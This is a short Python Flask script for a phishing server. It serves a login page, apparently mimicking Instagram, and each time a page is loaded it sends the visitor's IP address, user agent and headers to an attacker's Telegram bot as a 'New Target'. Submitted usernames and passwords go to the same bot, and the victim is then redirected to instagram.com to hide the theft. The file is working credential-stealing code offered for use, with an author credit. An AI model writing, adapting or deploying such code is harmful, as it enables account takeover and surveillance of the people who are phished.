try:
    from flask import *

    from flask_limiter import *

    from flask_limiter.util import get_remote_address

    import requests , time

except ImportError:

    exit("install requests and try again ...(pip install -r requirements.txt")
    
import config 
app = Flask(
    __name__,
    static_folder='static',
    template_folder='template'
)

limiter = Limiter(
    get_remote_address,
    app=app
)

def send_data(username , password):
    datas = f"""
    🎉The user has entered The information
    \n💌 USER NAME : {username}
    
    \n❗ PASSWORD : {password}
    

    🕛 Time : {time.strftime("%H : %M : %S")}
    
    \n⚜ Coded By : @zelroth

    """
    requests.get(f'https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage?chat_id={config.ADMIN}&text={datas}')
   
def send_ip(request):
    
    datas = f"""
    New Target Added 💘
    
    \n⭕ IP : {request.remote_addr}
    
    \n🎃 User-Agent : {request.user_agent}
    
    \n🔱 Headers :\n {request.headers}
    
    \n🕛 Date : {time.strftime("%H : %M : %S")}
    
    \n⚜ Coded By : @zelroth
    
    """
    requests.get(f'https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage?chat_id={config.ADMIN}&text={datas}')
    

@app.route('/' , methods=['GET'])
@limiter.limit('3/minute')
def index():
    send_ip(request)
    return render_template('login.html')

@app.route('/login' , methods=['POST'])
@limiter.limit('3/minute')
def get_data():
    username = request.form['username']
    password = request.form['password']
    send_data(username , password)
    return redirect('https://instagram.com')



if __name__ == "__main__":
    app.run('0.0.0.0' , 8022)
